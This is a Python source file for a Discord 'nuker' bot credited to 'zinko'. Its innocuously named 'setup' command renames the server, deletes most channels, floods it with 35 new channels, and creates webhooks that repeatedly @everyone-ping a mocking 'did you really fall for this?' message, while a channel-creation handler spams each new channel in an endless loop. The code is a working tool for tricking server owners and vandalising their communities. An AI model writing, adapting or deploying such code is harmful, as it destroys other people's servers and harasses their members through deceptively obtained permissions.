# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits
# by zinko give credits

import json
import os
import discord
from discord.ext import commands
import asyncio
from flask import Flask
from threading import Thread

# by zinko give credits
app = Flask('')

@app.route('/')
def home():
    return "thing"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    """Keep the Flask server running in a separate thread"""
    t = Thread(target=run)
    t.start()

# by zinko give credits
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    status = config["status"]
    activity = config["activity"]
    print(f"Loaded config.json")
except FileNotFoundError:
    token = input(f"Paste token: ")
    prefix = input(f"Paste prefix: ")
    owners = input(f"Paste bot's owner ID (If several use ','): ")
    whiteListYesOrNo = input(f"Enable whitelisting (y/n): ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" else False
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    else:
        owners = [int(owners)]

    status = {"isenabled": True, "type": "online"}
    activity = {"type": "listening", "text": f"Default Activity", "isenabled": True}

    config = {
        "token": token,
        "prefix": prefix,
        "status": status,
        "whitelistbool": whiteListBool,
        "activity": activity
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"Created config.json")

# by zinko give credits
intents = discord.Intents.default()
intents.message_content = True # by zinko give credits
intents.members = True  # by zinko give credits
intents.guilds = True  # by zinko give credits

bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} is awake!")

    # by zinko give credits
    activityToBot = None
    if activity["isenabled"]:
        activityToBot = discord.Game(name=activity["text"])  # by zinko give credits
    
    # by zinko give credits
    if status["isenabled"]:
        status_type = status["type"].lower()
        
        if status_type == "online":
            await bot.change_presence(status=discord.Status.online, activity=activityToBot)  # by zinko give credits
        elif status_type == "idle":
            await bot.change_presence(status=discord.Status.idle, activity=activityToBot)  # by zinko give credits
        elif status_type == "dnd":
            await bot.change_presence(status=discord.Status.dnd, activity=activityToBot)  # by zinko give credits
        else:
            await bot.change_presence(status=discord.Status.online, activity=activityToBot)  # by zinko give credits

# by zinko give credits
@bot.event
async def on_message(message):
    print(f"Received message: {message.content}")  # by zinko give credits
    if message.author == bot.user:
        return  # by zinko give credits
    if message.content.lower() == "hello":
        await message.channel.send("Hello there!")
    await bot.process_commands(message)  # by zinko give credits

# by zinko give credits
protected_servers = [1311927317991526420]

@bot.command()
@commands.cooldown(1, 2, commands.BucketType.user)
async def setup(ctx):
    """
    Nuke the server while skipping channels that can't be deleted.
    Specifically skips channels named 'announcements', 'rules', and 'moderator-only'.
    """
    # by zinko give credits
    print(f"Command triggered in server: {ctx.guild.name if ctx.guild else 'No guild'}")
    
    # by zinko give credits
    if not ctx.guild:
        await ctx.reply("I am not in this guild!")
        print("Bot is not in a guild.")
        return
    
    guild = ctx.guild
    print(f"Guild ID: {guild.id}, Guild Name: {guild.name}")
    
    # by zinko give credits
    if guild.id in protected_servers:
        await ctx.reply("dont try nuking this server, its protected")
        return

    # by zinko give credits
    await ctx.message.delete()
    
    try:
        await ctx.guild.edit(name="v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚")
        print(f"Successfully changed server name to 'v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚'")

        # by zinko give credits
        skip_channels = ["announcements", "rules", "moderator-only", "✅𝐑𝐮𝐥𝐞𝐬", "join-new-serv", "𝓐𝓝𝓝𝓞𝓤𝓒𝓔𝓜𝓔𝓝𝓣𝓢", "📢【-announcements-】📢", "📜【-rules-】📜", "⚠the-nest-rules📜", "🔊important-announcements💬", "🔔【-pings-】🔔", "👀【-sneak-peeks-】👀", "⁠💡【-codes-】💡", "⁠🌸【-kyattomis-channel-】🌸", "🪽【-s4lvers-channel-】🪽", "🎀【-tichs-channel-】🎀", "⁠🐢【-skxttles-channel-】🐢"] # by zinko give credits

        # by zinko give credits
        delete_tasks = []
        for channel in ctx.guild.channels:
            if channel.name.lower() in [skip_channel.lower() for skip_channel in skip_channels]:
                print(f"Skipping protected channel: {channel.name}")
                continue

            if channel.permissions_for(ctx.guild.me).manage_channels:
                delete_tasks.append(delete_channel(channel))

        await execute_in_batches(delete_tasks, batch_size=15, delay=0.3)

        ## by zinko give credits
        recreate_tasks = [ctx.guild.create_text_channel("v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝ ̷͉̩̬̰̉́́̿̈́͗̑̽̈́o̴̫͙̯͆͊͜n̸̛͕͇̻̮̗̯̾́̋̉̀̓̈̈́͝ͅ ̴̢͓͖̝̩͇͕̺͔͋͐̋͊̓̐t̸͆͑̃̒̿͜͝ǫ̴̛͎̭͐̔̒͝͝p̸̢̛̗̊̍̉̓̋̔͋̚") for _ in range(35)]
        await execute_in_batches(recreate_tasks, batch_size=7, delay=0.2)

        # by zinko give credits
        webhook_tasks = []
        for channel in ctx.guild.text_channels:
            for _ in range(5):  # by zinko give credits
                webhook_tasks.append(create_webhook_and_spam(channel))
        await execute_in_batches(webhook_tasks, batch_size=10, delay=0.2)

        await ctx.send("Nuked!")

    except Exception as e:
        print(f"Error during setup: {e}")
        await ctx.reply(f"An error occurred while trying to set up: {e}") # by zinko give credits

async def execute_in_batches(tasks, batch_size, delay):
    """Helper function to execute tasks in batches with a delay between batches""" # by zinko give credits
    for i in range(0, len(tasks), batch_size):
        batch = tasks[i:i+batch_size] # by zinko give credits
        await asyncio.gather(*batch)
        await asyncio.sleep(delay) # by zinko give credits
 # by zinko give credits
async def delete_channel(channel):
    """Deletes a channel and handles errors"""
    try:
        await channel.delete()
        print(f"Deleted channel: {channel.name}")
    except discord.Forbidden:
        print(f"Skipping undeletable channel: {channel.name}")
    except discord.HTTPException as e:
        print(f"Error deleting channel: {channel.name} | {e}")

async def create_webhook_and_spam(channel):
    """Creates a webhook and sends spam messages""" # by zinko give credits
    try:
        webhook = await channel.create_webhook(name=f"v̶͚̲̠͚̉̀̉̕̕ŏ̵͉̚i̶̠̥͗̍͊͆͛̐͋͒̕͘ḑ̸̯͔̲̳͉͍̀́̀̌̅̏͘͠͝{channel.id}") # by zinko give credits
        for _ in range(10):
            await webhook.send(f"@everyone did you really fall for this? https://tenor.com/view/nettspend-goat-flex-soundcloud-gif-10119250017410905119") # by zinko give credits
    except discord.Forbidden:
        print(f"Permission error creating webhook in {channel.name}")
    except discord.HTTPException:
        print(f"Error creating webhook in {channel.name}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown): # by zinko give credits
        hex_color = int("0x5564f1", 16)
        cooldown_embed = discord.Embed(
            title="Cooldown",
            description=f"```Wait {error.retry_after:.1f} seconds before trying again.```", # by zinko give credits
            color=hex_color)
        await ctx.reply(embed=cooldown_embed)
    else:
        print(f"Error: {error}")  # by zinko give credits
        raise error

@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone did you really fall for this? https://tenor.com/view/nettspend-goat-flex-soundcloud-gif-10119250017410905119")
# by zinko give credits
keep_alive()

# by zinko give credits
bot.run(token)  # by zinko give credits
# thanks
